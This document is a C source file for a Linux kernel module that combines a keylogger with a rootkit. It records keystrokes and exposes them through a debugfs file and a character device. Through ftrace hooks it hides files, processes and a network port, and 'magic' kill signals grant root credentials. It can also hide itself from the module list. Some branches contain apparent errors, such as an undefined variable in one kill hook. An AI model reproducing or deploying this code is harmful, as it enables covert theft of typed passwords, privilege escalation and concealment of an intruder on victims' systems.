#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/debugfs.h>

#ifdef HIDE_MODULE
#include <linux/list.h>
#include <linux/kobject.h>
static struct list_head *prev_module;
static struct kobject *prev_kobj;
static short hidden = 0;
#endif

MODULE_DESCRIPTION("");
MODULE_AUTHOR("");
MODULE_LICENSE("GPL");

#define DEVICE_NAME "kl0"
unsigned major;
char* major_string[10];

static char* target_process = "/etc/keylog/manager.o";
static struct dentry *file;
static struct dentry *subdir;

#ifndef BUFLEN
#define BUFLEN 1024
#endif
static char input_buf[BUFLEN];
unsigned buf_count = 0;
static int kl_notifier_call(struct notifier_block *, unsigned long, void *);
static ssize_t kl_device_read(struct file *, char __user *, size_t, loff_t *);

static struct notifier_block kl_notifier_block = { .notifier_call =
							   kl_notifier_call };

static struct file_operations fops = { .read = kl_device_read };

static unsigned long * __force_order;

#define PREFIX "keylog"

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* Global variable to store the pid that we are going to hide */
char hide_pid[NAME_MAX];
int hide_port = -1;
int port = 0000;

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port_ton = htons(port);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (hide_port != -1 && (port_ton == is->inet_sport || port_ton == is->inet_dport)) {
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				   ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_getdents64 and hook_getdents64 functions differently
 * depending on the kernel version. This is the larget barrier to
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0  && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

/* This is our hook for sys_getdetdents */
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    /* The linux_dirent struct got removed from the kernel headers so we have to
     * declare it ourselves */
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

/* This is our hooked function for sys_kill */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    switch(sig) {
		case 64:
			/* If we receive the magic signal, then we just sprintf the pid
			* from the intercepted arguments into the hide_pid string */
			printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
			sprintf(hide_pid, "%d", pid);
			return 0;
		case 87: 
			port = pid;
			return 0;
	    case 94: 
			buf_count = 0;
			memset(input_buf, 0, BUFLEN);
			return 0;
		case 52:
			printk(KERN_INFO "rootkit: giving root...\n");
			set_root();
			return 0;
		default:
			return orig_kill(regs);
	}
}
#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{
    /* This is an old structure that isn't included in the kernel headers anymore, so we 
     * have to declare it ourselves */
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;
}
asmlinkage int hook_kill(pid_t pid, int sig)
{
    switch(sig) {
		case 64:
			/* If we receive the magic signal, then we just sprintf the pid
			* from the intercepted arguments into the hide_pid string */
			printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
			sprintf(hide_pid, "%d", pid);
			return 0;
		case 87: 
			port = pid;
			return 0;
	    case 94: 
			buf_count = 0;
			memset(input_buf, 0, BUFLEN);
			return 0;
		case 52:
			printk(KERN_INFO "rootkit: giving root...\n");
			set_root();
			return 0;
		default:
			return orig_kill(regs);
	}
}
#endif

static int kl_notifier_call(struct notifier_block *nb, unsigned long action,
			    void *data)
{
	struct keyboard_notifier_param *param = data;
	char c = param->value;

	if (!param->down || action != KBD_KEYSYM) {
		/* user not pressing key or event is not KBD_KEYSYM */
		return NOTIFY_DONE;
	}

	if (c == 0x01) {
		input_buf[buf_count++] = 0x0a;
	} else if (c >= 0x20 && c < 0x7f) {
		input_buf[buf_count++] = c;
	}

	if (buf_count >= BUFLEN) {
		buf_count = 0;
		memset(input_buf, 0, BUFLEN);
	}

	return NOTIFY_OK;
}

static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
			      loff_t *offset)
{
	size_t buflen = strlen(input_buf);
	int ret;

	ret = copy_to_user(buf, input_buf, buflen);
	if (ret) {
		printk(KERN_ERR
		       "keylog: Unable to copy from kernel buffer to user space buffer\n");
		return -ret;
	}

	memset(input_buf, 0, BUFLEN);
	buf_count = 0;

	return buflen;
}

#ifdef HIDE_MODULE
/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void)
{
	hidden=0;
    list_add(&THIS_MODULE->list, prev_module);
	kobject_add(prev_kobj);
	list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj.entry);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
	hidden=1;
    prev_module = THIS_MODULE->list.prev;
	prev_kobj = &THIS_MODULE->mkobj.kobj;
    list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}
#endif

inline void cr0_write(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    cr0_write(cr0);
}

static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int spawnProcess(char* path) {

    int rc;
	char* argv[] = {path, NULL};
	static char* envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    
	rc = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
	printk("RC is: %i \n", rc);
	return rc;
}

static int __init kl_init(void)
{
	int i;
	int err;
	int ret;
    subdir = debugfs_create_dir("keylog", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("log", 0400, subdir, NULL, &fops);
	if (!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}
	ret = register_chrdev(0, DEVICE_NAME, &fops);
	if (ret < 0) {
		printk(KERN_ERR
		       "keylog: Unable to register character device\n");
		return ret;
	}
	major = ret;
    pr_debug("%d", major);
	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
	protect_memory();
	ret = register_keyboard_notifier(&kl_notifier_block);
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;
	unprotect_memory();
	if (ret) {
		printk(KERN_ERR
		       "keylog: Unable to register keyboard notifier\n");
		return -ret;
	}
	i = spawnProcess(target_process);
    printk(KERN_INFO "keylog: return value %d\n",i);

	memset(input_buf, 0, BUFLEN);

#ifdef HIDE_MODULE
	/* Hide myself from lsmod and /proc/modules :) */
	// hideme();
#endif

	return 0;
}

static void __exit kl_exit(void)
{
	protect_memory();
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&kl_notifier_block);
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	unprotect_memory();
    debugfs_remove_recursive(subdir);
}

module_init(kl_init);
module_exit(kl_exit);